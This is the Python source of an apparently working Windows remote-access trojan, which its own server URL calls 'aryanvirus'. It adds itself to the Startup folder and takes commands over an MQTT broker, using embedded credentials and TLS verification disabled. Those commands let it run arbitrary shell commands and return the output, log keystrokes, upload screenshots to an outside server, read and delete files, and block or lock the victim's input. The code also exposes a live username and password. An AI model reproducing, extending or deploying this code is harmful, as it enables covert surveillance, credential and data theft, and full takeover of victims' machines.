import paho.mqtt.client as mqtt
import threading
import socket
import uuid
import time
import pyautogui as pg
import keyboard
import os
import subprocess
import webbrowser
import requests
import shutil
from pathlib import Path
import sys
import ssl
import traceback
import winsound
# Function imports
import blockInput
from notepadType import notepad_write,draw_heart,start_random_move,stop_random_move
from prompt import alertPrompt, inputPrompt
from klogging import start_logging,stop_logging
from filecontrol import list_folder,read_file,delete_file
from systemcontrol import display_off,display_on

# Startup setup
FLAG_FILE = Path(os.getenv('APPDATA')) / "firstrun.flag"

def add_to_startup():
    try:
        startup_dir = Path(os.getenv('APPDATA')) / r"Microsoft\Windows\Start Menu\Programs\Startup"
        exe_path = Path(sys.argv[0]).resolve()
        destination = startup_dir / exe_path.name
        if not destination.exists():
            shutil.copy(exe_path, destination)
    except Exception as e:
        print(f"Failed to add to startup: {e}")

if not FLAG_FILE.exists():
    add_to_startup()
    FLAG_FILE.touch()

# Server / MQTT settings
# serverUrl = "http://localhost:3000"
serverUrl = "https://aryanvirus.onrender.com"
BROKER = "n171f1d9.ala.eu-central-1.emqxsl.com"
PORT = 8883
USERNAME = "aryanvish2006"
PASSWORD = "aryanvishvishalyadav"

POLL_INTERVAL = 60

# PC identification
pc_name = socket.gethostname()
mac = hex(uuid.getnode())
pc_id = f"{pc_name}_{mac}"

# MQTT topics
CONTROL_TOPIC = f"control/{pc_id}"
ACK_TOPIC = f"ack/{pc_id}"
# Screenshot
def take_screenshot():
    try:
        filename = f"{pc_name}_screenshot.png"
        pg.screenshot(filename)
        with open(filename, "rb") as f:
            requests.post(f"{serverUrl}/upload", files={"screenshot": f}, timeout=5)
        os.remove(filename)
    except Exception as e:
        print(f"[screenshot error] {e}")

def safe_thread(target, *args, **kwargs):
    def wrapper():
        try:
            target(*args, **kwargs)
        except Exception as e:
            print(f"[ERROR] {target.__name__}: {e}")
            traceback.print_exc()
    t = threading.Thread(target=wrapper, daemon=True)
    t.start()

# Handle all messages
def handle_msg(msg):
    try:
        msg = msg.strip().lower()

        if msg == "block":
            safe_thread(blockInput.start_block, "both")
        elif msg == "blockkeyboard":
            safe_thread(blockInput.start_block, "keyboard")
        elif msg == "blockmouse":
            safe_thread(blockInput.start_block, "mouse")
        elif msg == "unblock":
            safe_thread(blockInput.unblock_all)
        elif msg == "shutdown":
            safe_thread(os.system, "shutdown /s /t 0")
        elif msg == "desktop":
            safe_thread(pg.hotkey, "win", "d")
        elif msg == "close":
            safe_thread(keyboard.send, "alt+f4")
        elif msg == "screenshot":
            safe_thread(take_screenshot)
        elif msg == "lock":
            safe_thread(os.system, "rundll32.exe user32.dll,LockWorkStation")
        elif msg == "cut":
            safe_thread(pg.press, "backspace")
        elif msg == "drawheart":
            draw_heart()
        elif msg == "rightclick":
            pg.rightClick()  
        elif msg == "leftclick":
            pg.leftClick()    
        elif msg == "click":
            pg.click()   
        elif msg == "doubleclick":
            pg.doubleClick()  
        elif msg == "displayoff":
            display_off()
        elif msg == "displayon":
            display_on()        
        elif msg =="startrandommove":
            start_random_move()
        elif msg == "stoprandommove":
            stop_random_move()  
        elif msg == "startkeylog":
            start_logging()
            client.publish(ACK_TOPIC,"Started Logging")
        elif msg == "stopkeylog":
            data = stop_logging()
            client.publish(ACK_TOPIC,f"Logged data of : {pc_id} : {data}")      
        elif msg == "end":
            os._exit(0)

        elif msg.startswith("subprocess"):
            cmd = msg[len("subprocess "):]
            safe_thread(subprocess.run, cmd, shell=True)

        elif msg.startswith("browser"):
            url = msg[len("browser "):]
            safe_thread(webbrowser.open, url)

        elif msg.startswith("type"):
            text = msg[len("type "):]
            safe_thread(pg.typewrite, text, 0.2)

        elif msg.startswith("notepadtypeheart"):
            text = msg[len("notepadtypeheart "):]
            safe_thread(notepad_write, text, True)

        elif msg.startswith("notepadtype"):
            text = msg[len("notepadtype "):]
            safe_thread(notepad_write, text, False)

        elif msg.startswith("press"):
            key = msg[len("press "):]
            safe_thread(pg.press, key)

        elif msg.startswith("alertprompt"):
            text = msg[len("alertprompt "):]
            safe_thread(alertPrompt, text)

        elif msg.startswith("inputprompt"):
            text = msg[len("inputprompt "):]
            def handle_input():
                value = inputPrompt(text)
                client.publish(ACK_TOPIC, value)
            safe_thread(handle_input)
        elif msg.startswith("playtone"):
            parts = msg[len("playtone "):].split()
            if len(parts) == 2:
                safe_thread(winsound.Beep, int(parts[0]), int(parts[1]))    
        elif msg.startswith("keydown"):
            text = msg[len("keydown "):]
            safe_thread(pg.keyDown, text, 0.2) 
        elif msg.startswith("keyup"):
            text = msg[len("keyup "):]
            safe_thread(pg.keyUp, text, 0.2) 
                      
        elif msg.startswith("backspace"):
            count = int(msg[len("backspace "):])
            def backspacer():
                for _ in range(count):
                    pg.press("backspace")
                    time.sleep(0.05)
            safe_thread(backspacer)

        elif msg.startswith("blockkey"):
            key = msg[len("blockkey "):]
            safe_thread(keyboard.block_key, key)

        elif msg.startswith("unblockkey"):
            key = msg[len("unblockkey "):]
            safe_thread(keyboard.unblock_key, key)

        elif msg.startswith("remap"):
            parts = msg[len("remap "):].split()
            if len(parts) == 2:
                safe_thread(keyboard.remap_key, parts[0], parts[1])

        elif msg.startswith("swapkey"):
            parts = msg[len("swapkey "):].split()
            if len(parts) == 2:
                def swap():
                    keyboard.remap_key(parts[0], parts[1])
                    keyboard.remap_key(parts[1], parts[0])
                safe_thread(swap)
        elif msg.startswith("listfolder"):
            cmd = msg[len("listfolder "):]
            def list():
                dataread = list_folder(cmd)
                client.publish(ACK_TOPIC,f"List Folder :--> {dataread}")
            safe_thread(list)  

        elif msg.startswith("readfile"):
            parts = msg[len("readfile "):].split()
            if len(parts) == 2:
                def read():
                    dataread=read_file(parts[0],parts[1])
                    client.publish(ACK_TOPIC,f"File Read :---> {dataread}")
                safe_thread(read)  
        elif msg.startswith("deletefile"):
            parts = msg[len("deletefile "):].split()
            if len(parts) == 2:
                def delete():
                    dataread=delete_file(parts[0],parts[1])
                    client.publish(ACK_TOPIC,f"File Delete :---> {dataread}")
                safe_thread(delete)                

        elif msg.startswith("cmdwithoutput"):
            cmd = msg[len("cmdwithoutput "):]
            def cmd_exec():
                try:
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    client.publish(ACK_TOPIC,f"SUBPROCESS_{pc_id} :--Result--> {result.stdout} :--Error-->{result.stderr}")
                except Exception as e:
                    client.publish(ACK_TOPIC, f"Error: {e}")
            safe_thread(cmd_exec)

    except Exception as e:
        print(f"[FATAL ERROR in handle_msg]: {e}")
        traceback.print_exc()

# Send initial trace
def send_data():
    try:
        client.publish(ACK_TOPIC, f"TRACE : {pc_id}")
        requests.get(f"{serverUrl}/posttrace", params={"pc_id": pc_id})
        print("sent")
    except:
        pass

def send_handler():
    threading.Thread(target=send_data).start()

keyboard.add_hotkey("ctrl+shift+q", send_handler)
keyboard.add_hotkey("ctrl+shift+a+s", stop_random_move)
# MQTT callbacks
def on_connect(client, userdata, flags, rc):
    print(f"{pc_id} Connected to MQTT broker, code: {rc}")
    client.subscribe(CONTROL_TOPIC)
    client.publish(ACK_TOPIC, f"{pc_id} Connected")

def on_message(client, userdata, msg):
    message = msg.payload.decode()
    print(f"Received: {message}")
    handle_msg(message)
    client.publish(ACK_TOPIC, f"ACK:{pc_id}")

# MQTT client setup
client = mqtt.Client()
client.username_pw_set(USERNAME, PASSWORD)
client.tls_set(cert_reqs=ssl.CERT_NONE)
client.tls_insecure_set(True)
client.on_connect = on_connect
client.on_message = on_message

HEARTBEAT_INTERVAL = 20
HEARTBEAT_TOPIC = f"heartbeat/{pc_id}"
def heartbeat_loop():
    while True:
        try:
            if client.is_connected():
                client.publish(HEARTBEAT_TOPIC,"1")
        except Exception as e:
            print(e)
        time.sleep(HEARTBEAT_INTERVAL)  
threading.Thread(target=heartbeat_loop,daemon=True).start()   

def connect_mqtt():
    while True:
        try:
            client.connect(BROKER, PORT, 60)
            break
        except Exception as e:
            print(f"MQTT connection failed: {e}, retrying in 5s...")
            time.sleep(5)

connect_mqtt()
client.loop_forever()



